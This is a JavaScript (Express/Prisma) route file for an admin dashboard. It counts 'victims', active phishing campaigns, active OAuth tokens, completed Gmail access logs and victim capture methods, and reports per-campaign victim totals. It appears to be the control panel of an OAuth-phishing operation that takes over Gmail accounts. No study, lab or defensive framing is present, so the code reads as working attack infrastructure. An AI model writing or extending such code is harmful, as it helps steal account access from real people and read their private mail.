// Dashboard routes aggregator
const express = require('express');
const router = express.Router();
const { PrismaClient } = require('@prisma/client');

const overviewRoutes = require('./overview');
const analyticsRoutes = require('./analytics');

// Initialize repositories
const prisma = new PrismaClient();
const VictimRepository = require('../../../../repositories/victimRepository');
const CampaignRepository = require('../../../../repositories/campaignRepository');
const OAuthTokenRepository = require('../../../../repositories/oauthTokenRepository');
const GmailAccessLogRepository = require('../../../../repositories/gmailAccessLogRepository');
const ActivityLogRepository = require('../../../../repositories/activityLogRepository');
const logger = require('../../../../utils/logger');

const victimRepository = new VictimRepository(prisma);
const campaignRepository = new CampaignRepository(prisma);
const oauthTokenRepository = new OAuthTokenRepository(prisma);
const gmailAccessLogRepository = new GmailAccessLogRepository(prisma);
const activityLogRepository = new ActivityLogRepository(prisma);

// GET /api/admin/dashboard - Main dashboard endpoint (combines all metrics)
router.get('/', async (req, res) => {
  try {
    // Get all victims count
    const allVictims = await victimRepository.findMany({}, { page: 1, limit: 1 });
    const totalVictims = allVictims.total;

    // Get active campaigns
    const activeCampaigns = await campaignRepository.findMany({ status: 'active' });
    
    // Get recent victims (last 24 hours)
    const yesterday = new Date();
    yesterday.setDate(yesterday.getDate() - 1);
    const recentVictims = await victimRepository.findMany(
      { startDate: yesterday.toISOString() },
      { page: 1, limit: 1000 }
    );

    // Get OAuth tokens count
    const allOAuthTokens = await prisma.oAuthToken.findMany({
      where: { tokenStatus: 'active' }
    });

    // Get Gmail access logs count
    const gmailAccessLogs = await prisma.gmailAccessLog.findMany({
      where: { status: 'completed' }
    });

    // Get registration completed count
    const allVictimsForStats = await victimRepository.findMany({}, { page: 1, limit: 10000 });
    const registrationCompleted = allVictimsForStats.victims.filter(v => 
      v.validation?.registrationCompleted
    ).length;

    // Calculate statistics
    const statistics = {
      totalVictims,
      totalCampaigns: activeCampaigns.length,
      recentVictims: recentVictims.total,
      totalOAuthTokens: allOAuthTokens.length,
      totalGmailAccess: gmailAccessLogs.length,
      registrationCompleted,
      registrationRate: totalVictims > 0 ? (registrationCompleted / totalVictims * 100).toFixed(2) : 0
    };

    // Get campaign performance
    const campaignPerformance = await Promise.all(
      activeCampaigns.map(async (campaign) => {
        const campaignVictims = await victimRepository.findMany(
          { campaignId: campaign.id },
          { page: 1, limit: 1000 }
        );
        return {
          id: campaign.id,
          name: campaign.name,
          code: campaign.code,
          totalVictims: campaignVictims.total,
          registrationCompleted: campaignVictims.victims.filter(v => 
            v.validation?.registrationCompleted
          ).length
        };
      })
    );

    res.status(200).json({
      success: true,
      statistics,
      campaignPerformance,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    logger.error('Error fetching dashboard data:', error);
    res.status(500).json({
      error: 'Failed to fetch dashboard data',
      message: error.message
    });
  }
});

// GET /api/admin/dashboard/overview - Overview metrics
router.get('/overview', async (req, res) => {
  try {
    const allVictims = await victimRepository.findMany({}, { page: 1, limit: 1 });
    const activeCampaigns = await campaignRepository.findMany({ status: 'active' });
    const allOAuthTokens = await prisma.oAuthToken.findMany({
      where: { tokenStatus: 'active' }
    });

    res.status(200).json({
      success: true,
      data: {
        totalVictims: allVictims.total,
        activeCampaigns: activeCampaigns.length,
        activeOAuthTokens: allOAuthTokens.length
      }
    });
  } catch (error) {
    logger.error('Error fetching dashboard overview:', error);
    res.status(500).json({
      error: 'Failed to fetch dashboard overview',
      message: error.message
    });
  }
});

// GET /api/admin/dashboard/campaign-performance - Campaign metrics
router.get('/campaign-performance', async (req, res) => {
  try {
    const campaigns = await campaignRepository.findMany({});
    
    const performance = await Promise.all(
      campaigns.map(async (campaign) => {
        const victims = await victimRepository.findMany(
          { campaignId: campaign.id },
          { page: 1, limit: 1000 }
        );
        return {
          id: campaign.id,
          name: campaign.name,
          code: campaign.code,
          status: campaign.status,
          totalVictims: victims.total,
          registrationCompleted: victims.victims.filter(v => 
            v.validation?.registrationCompleted
          ).length,
          createdAt: campaign.createdAt
        };
      })
    );

    res.status(200).json({
      success: true,
      data: performance
    });
  } catch (error) {
    logger.error('Error fetching campaign performance:', error);
    res.status(500).json({
      error: 'Failed to fetch campaign performance',
      message: error.message
    });
  }
});

// GET /api/admin/dashboard/victim-analytics - Victim analytics
router.get('/victim-analytics', async (req, res) => {
  try {
    const allVictims = await victimRepository.findMany({}, { page: 1, limit: 10000 });
    
    // Group by capture method
    const byCaptureMethod = {};
    allVictims.victims.forEach(victim => {
      const method = victim.captureMethod || 'unknown';
      byCaptureMethod[method] = (byCaptureMethod[method] || 0) + 1;
    });

    // Group by registration status
    const registrationStats = {
      completed: allVictims.victims.filter(v => v.validation?.registrationCompleted).length,
      pending: allVictims.victims.filter(v => !v.validation?.registrationCompleted).length
    };

    res.status(200).json({
      success: true,
      data: {
        total: allVictims.total,
        byCaptureMethod,
        registrationStats
      }
    });
  } catch (error) {
    logger.error('Error fetching victim analytics:', error);
    res.status(500).json({
      error: 'Failed to fetch victim analytics',
      message: error.message
    });
  }
});

// GET /api/admin/dashboard/system-health - System health status
router.get('/system-health', async (req, res) => {
  try {
    const dbStatus = await prisma.$queryRaw`SELECT 1 as health`;
    const isDbHealthy = dbStatus && dbStatus.length > 0;

    res.status(200).json({
      success: true,
      data: {
        database: isDbHealthy ? 'healthy' : 'unhealthy',
        timestamp: new Date().toISOString()
      }
    });
  } catch (error) {
    logger.error('Error checking system health:', error);
    res.status(500).json({
      error: 'Failed to check system health',
      message: error.message,
      data: {
        database: 'unhealthy',
        timestamp: new Date().toISOString()
      }
    });
  }
});

router.use('/overview', overviewRoutes);
router.use('/analytics', analyticsRoutes);

module.exports = router;

